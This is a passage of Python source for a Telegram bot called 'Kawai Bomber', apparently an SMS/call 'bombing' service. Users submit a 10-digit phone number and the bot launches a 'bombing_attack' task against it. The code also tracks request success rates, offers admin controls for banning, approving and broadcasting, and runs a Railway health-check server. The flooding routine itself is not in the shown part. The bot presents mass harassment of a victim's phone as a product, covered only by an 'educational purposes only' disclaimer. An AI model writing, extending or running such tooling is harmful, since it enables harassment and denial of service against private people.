        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /ban command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/ban <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        user_to_ban = int(context.args[0])
        banned_users.add(user_to_ban)
        if user_to_ban in user_sessions:
            user_sessions[user_to_ban]["task"].cancel()
            del user_sessions[user_to_ban]
            global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['skull']} 𝕌𝕤𝕖𝕣 `{user_to_ban}` 𝕓𝕒𝕟𝕟𝕖𝕕!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    total_req = global_stats["total_requests"]
    total_success = sum(us["success"] for us in user_stats.values())
    success_rate = (total_success / (total_req + 1)) * 100
    uptime = int(time.time() - global_stats["start_time"])
    
    status_text = f"""
{ANIME_STYLES['crown']} *𝐀𝐃𝐌𝐈𝐍 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐀𝐍𝐄𝐋* {ANIME_STYLES['crown']}

{ANIME_STYLES['star']} *𝔹𝕠𝕥 𝕊𝕥𝕒𝕥𝕤:*
  {ANIME_STYLES['rocket']} 𝕌𝕡𝕥𝕚𝕞𝕖: `{uptime}s`
  {ANIME_STYLES['bomb']} 𝕋𝕠𝕥𝕒𝕝 𝔹𝕠𝕞𝕓𝕤: `{global_stats['total_bombs']}`
  {ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{global_stats['active_sessions']}`
  {ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{global_stats['total_users']}`
  {ANIME_STYLES['zap']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{total_req}`
  {ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤 ℝ𝕒𝕥𝕖: `{success_rate:.2f}%`

{ANIME_STYLES['shield']} *𝕌𝕤𝕖𝕣 𝕊𝕥𝕒𝕥𝕤:*
  {ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟𝕤: `{len(admin_users)}`
  {ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(approved_users)}`
  {ANIME_STYLES['lock']} 𝔹𝕒𝕟𝕟𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(banned_users)}`
"""
    
    await update.message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /broadcast command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if not context.args:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/broadcast <message>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    message = " ".join(context.args)
    
    broadcast_msg = await update.message.reply_text(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥𝕚𝕟𝕘...")
    
    try:
        await broadcast_msg.edit_text(
            f"{ANIME_STYLES['success']} *𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!*\n\nMessage sent to all users.",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

# ========== CALLBACK HANDLERS ==========
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if query.data == 'start_attack':
        await query.edit_message_text(
            f"{ANIME_STYLES['fire']} *𝐒𝐓𝐀𝐑𝐓 𝐀𝐓𝐓𝐀𝐂𝐊* {ANIME_STYLES['fire']}\n\n"
            "𝕊𝕖𝕟𝕕 𝕞𝕖 𝕥𝕙𝕖 𝕡𝕙𝕠𝕟𝕖 𝕟𝕦𝕞𝕓𝕖𝕣:\n"
            "𝔽𝕠𝕣𝕞𝕒𝕥: `9876543210`\n\n"
            "𝕆𝕣 𝕦𝕤𝕖 𝕔𝕠𝕞𝕞𝕒𝕟𝕕: `/bomb 9876543210`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            f"{ANIME_STYLES['info']} *𝐇𝐄𝐋𝐏 𝐆𝐔𝐈𝐃𝐄* {ANIME_STYLES['info']}\n\n"
            "• 𝕌𝕤𝕖 `/bomb <number>` 𝕥𝕠 𝕤𝕥𝕒𝕣𝕥 𝕒𝕥𝕥𝕒𝕔𝕜\n"
            "• 𝕌𝕤𝕖 `/stop` 𝕥𝕠 𝕤𝕥𝕠𝕡 𝕔𝕦𝕣𝕣𝕖𝕟𝕥 𝕒𝕥𝕥𝕒𝕔𝕜\n"
            "• 𝔸𝕦𝕥𝕠-𝕤𝕥𝕠𝕡 𝕒𝕗𝕥𝕖𝕣 𝟙 𝕙𝕠𝕦𝕣 𝕗𝕠𝕣 𝕟𝕠𝕣𝕞𝕒𝕝 𝕦𝕤𝕖𝕣𝕤\n"
            "• 𝕌𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕 𝕥𝕚𝕞𝕖 𝕗𝕠𝕣 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕦𝕤𝕖𝕣𝕤\n\n"
            f"{ANIME_STYLES['warning']} *𝐃𝐈𝐒𝐂𝐋𝐀𝐈𝐌𝐄𝐑*\n"
            "𝔽𝕠𝕣 𝕖𝕕𝕦𝕔𝕒𝕥𝕚𝕠𝕟𝕒𝕝 𝕡𝕦𝕣𝕡𝕠𝕤𝕖𝕤 𝕠𝕟𝕝𝕪!\n\n"
            f"{ANIME_STYLES['star']} *𝐂𝐫𝐞𝐝𝐢𝐭𝐬*\n"
            "𝕄𝕒𝕕𝕖 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙\n"
            "ℙ𝕠𝕨𝕖𝕣𝕖𝕕 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'status':
        if user_id in user_sessions:
            session = user_sessions[user_id]
            elapsed = int(time.time() - session["start_time"])
            stats = user_stats[user_id]
            success_rate = (stats['success'] / stats['requests'] * 100) if stats['requests'] > 0 else 0
            
            await query.edit_message_text(
                f"{ANIME_STYLES['fire']} *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒* {ANIME_STYLES['fire']}\n\n"
                f"{ANIME_STYLES['phone']} 𝕋𝕒𝕣𝕘𝕖𝕥: `{session['phone']}`\n"
                f"{ANIME_STYLES['clock']} 𝔼𝕝𝕒𝕡𝕤𝕖𝕕: `{elapsed}s`\n"
                f"{ANIME_STYLES['bomb']} ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{stats['requests']}`\n"
                f"{ANIME_STYLES['success']} 𝕊𝕦𝕔𝕔𝕖𝕤𝕤: `{stats['success']}`\n"
                f"{ANIME_STYLES['error']} 𝔽𝕒𝕚𝕝𝕖𝕕: `{stats['failed']}`\n"
                f"{ANIME_STYLES['star']} ℝ𝕒𝕥𝕖: `{success_rate:.1f}%`\n"
                f"{ANIME_STYLES['shield']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕: `{'✅ 𝕐𝕖𝕤' if is_approved(user_id) else '❌ ℕ𝕠'}`",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await query.edit_message_text(
                f"{ANIME_STYLES['info']} *𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒*\n\n"
                f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝔸𝕥𝕥𝕒𝕔𝕜: `{'✅ 𝕐𝕖𝕤' if user_id in user_sessions else '❌ ℕ𝕠'}`\n"
                f"{ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣: `{'✅ 𝕐𝕖𝕤' if is_approved(user_id) else '❌ ℕ𝕠'}`\n"
                f"{ANIME_STYLES['crown']} 𝔸𝕕𝕞𝕚𝕟: `{'✅ 𝕐𝕖𝕤' if is_admin(user_id) else '❌ ℕ𝕠'}`\n\n"
                f"{ANIME_STYLES['star']} 𝕋𝕠𝕥𝕒𝕝 ℝ𝕖𝕢𝕦𝕖𝕤𝕥𝕤: `{user_stats[user_id]['requests']}`",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif query.data == 'admin_panel':
        if not is_admin(user_id):
            await query.edit_message_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
            return
        
        keyboard = [
            [InlineKeyboardButton(f"{ANIME_STYLES['crown']} 𝔸𝕕𝕕 𝔸𝕕𝕞𝕚𝕟", callback_data='admin_add'),
             InlineKeyboardButton(f"{ANIME_STYLES['success']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖", callback_data='admin_approve')],
            [InlineKeyboardButton(f"{ANIME_STYLES['error']} ℝ𝕖𝕞𝕠𝕧𝕖", callback_data='admin_remove'),
             InlineKeyboardButton(f"{ANIME_STYLES['skull']} 𝔹𝕒𝕟", callback_data='admin_ban')],
            [InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝕊𝕥𝕒𝕥𝕤", callback_data='admin_stats'),
             InlineKeyboardButton(f"{ANIME_STYLES['rocket']} 𝔹𝕣𝕠𝕒𝕕𝕔𝕒𝕤𝕥", callback_data='admin_broadcast')],
            [InlineKeyboardButton(f"{ANIME_STYLES['back']} 𝔹𝕒𝕔𝕜", callback_data='back_main')]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"{ANIME_STYLES['crown']} *𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋* {ANIME_STYLES['crown']}\n\n"
            f"{ANIME_STYLES['users']} 𝕋𝕠𝕥𝕒𝕝 𝕌𝕤𝕖𝕣𝕤: `{len(all_users)}`\n"
            f"{ANIME_STYLES['fire']} 𝔸𝕔𝕥𝕚𝕧𝕖 𝕊𝕖𝕤𝕤𝕚𝕠𝕟𝕤: `{len(user_sessions)}`\n"
            f"{ANIME_STYLES['unlock']} 𝔸𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕌𝕤𝕖𝕣𝕤: `{len(approved_users)}`\n\n"
            "𝕊𝕖𝕝𝕖𝕔𝕥 𝕒𝕟 𝕠𝕡𝕥𝕚𝕠𝕟:",
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_add':
        await query.edit_message_text(
            f"{ANIME_STYLES['crown']} *𝐀𝐃𝐃 𝐀𝐃𝐌𝐈𝐍*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/addadmin <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/addadmin 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_approve':
        await query.edit_message_text(
            f"{ANIME_STYLES['success']} *𝐀𝐏𝐏𝐑𝐎𝐕𝐄 𝐔𝐒𝐄𝐑*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/approve <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/approve 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_remove':
        await query.edit_message_text(
            f"{ANIME_STYLES['error']} *𝐑𝐄𝐌𝐎𝐕𝐄 𝐔𝐒𝐄𝐑*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/removeuser <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/removeuser 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_ban':
        await query.edit_message_text(
            f"{ANIME_STYLES['skull']} *𝐁𝐀𝐍 𝐔𝐒𝐄𝐑*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/ban <user_id>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/ban 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'admin_stats':
        await status_command(update, context)
        return
    
    elif query.data == 'admin_broadcast':
        await query.edit_message_text(
            f"{ANIME_STYLES['rocket']} *𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐌𝐄𝐒𝐒𝐀𝐆𝐄*\n\n"
            "𝐔𝐬𝐚𝐠𝐞: `/broadcast <your message>`\n\n"
            "𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/broadcast 𝕊𝕖𝕣𝕧𝕖𝕣 𝕞𝕒𝕚𝕟𝕥𝕖𝕟𝕒𝕟𝕔𝕖 𝕚𝕟 𝟙𝟘 𝕞𝕚𝕟𝕦𝕥𝕖𝕤`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'back_main':
        keyboard = [
            [InlineKeyboardButton(f"{ANIME_STYLES['fire']} 𝐒𝐭𝐚𝐫𝐭 𝐀𝐭𝐭𝐚𝐜𝐤", callback_data='start_attack')],
            [InlineKeyboardButton(f"{ANIME_STYLES['info']} 𝐇𝐞𝐥𝐩", callback_data='help'),
             InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')]
        ]
        
        if is_admin(user_id):
            keyboard.append([InlineKeyboardButton(f"{ANIME_STYLES['crown']} 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥", callback_data='admin_panel')])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            get_anime_banner(),
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct phone number messages"""
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        return
    
    phone = update.message.text.strip()
    
    if not phone.isdigit() or len(phone) != 10:
        return
    
    if user_id in user_sessions:
        await update.message.reply_text(f"{ANIME_STYLES['warning']} 𝕐𝕠𝕦 𝕒𝕝𝕣𝕖𝕒𝕕𝕪 𝕙𝕒𝕧𝕖 𝕒𝕟 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜! 𝕌𝕤𝕖 /𝕤𝕥𝕠𝕡 𝕗𝕚𝕣𝕤𝕥.")
        return
    
    # Start bombing attack
    task = asyncio.create_task(bombing_attack(phone, user_id, update.effective_chat.id, context))
    user_sessions[user_id] = {
        "start_time": time.time(),
        "phone": phone,
        "task": task
    }
    global_stats["active_sessions"] += 1
    global_stats["total_bombs"] += 1

# ========== SESSION CLEANUP TASK ==========
async def cleanup_sessions():
    """Cleanup expired sessions periodically"""
    while True:
        try:
            current_time = time.time()
            expired_users = []
            
            for user_id, session in user_sessions.items():
                # Check if session expired (1 hour for non-approved users)
                if not is_approved(user_id) and current_time - session["start_time"] > 3600:
                    expired_users.append(user_id)
            
            # Cleanup expired sessions
            for user_id in expired_users:
                if user_id in user_sessions:
                    user_sessions[user_id]["task"].cancel()
                    try:
                        await user_sessions[user_id]["task"]
                    except asyncio.CancelledError:
                        pass
                    del user_sessions[user_id]
                    global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)
            
            await asyncio.sleep(30)
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            await asyncio.sleep(30)

# ========== AUTOSAVE TASK ==========
async def autosave_task():
    """Auto-save bot state periodically"""
    while True:
        try:
            save_state()
            logger.info("✅ Auto-save completed")
            await asyncio.sleep(300)
        except Exception as e:
            logger.error(f"❌ Auto-save error: {e}")
            await asyncio.sleep(300)

# ========== SIGNAL HANDLERS ==========
def handle_shutdown(signum, frame):
    """Handle shutdown signals"""
    logger.info("🛑 Shutdown signal received. Saving state...")
    save_state()
    
    # Cancel all active sessions
    for user_id, session in user_sessions.items():
        session["task"].cancel()
    
    sys.exit(0)

# ========== RAILWAY HEALTH CHECK ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            health_data = {
                "status": "healthy",
                "bot": "Kawai Bomber",
                "users": len(all_users),
                "active_sessions": global_stats["active_sessions"],
                "total_bombs": global_stats["total_bombs"],
                "environment": RAILWAY_ENVIRONMENT,
                "uptime": int(time.time() - global_stats["start_time"])
            }
            self.wfile.write(json.dumps(health_data).encode())
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
            <head><title>Kawai Bomber Bot</title></head>
            <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
                <h1>🌸✨ Kawai Bomber Bot ✨🌸</h1>
                <p>Status: <strong>🟢 RUNNING</strong></p>
                <p>Users: {len(all_users)}</p>
                <p>Active Sessions: {global_stats['active_sessions']}</p>
                <p>Environment: {RAILWAY_ENVIRONMENT}</p>
                <p>Made by: @zerocyph</p>
                <p>Powered by: @zerocyph</p>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Disable default logging
        pass

def start_health_server():
    """Start a simple HTTP server for Railway health checks"""
    try:
        server = HTTPServer(('0.0.0.0', 8080), HealthHandler)
        print(f"🏥 Health server started on port 8080")
        server.serve_forever()
    except Exception as e:
        print(f"
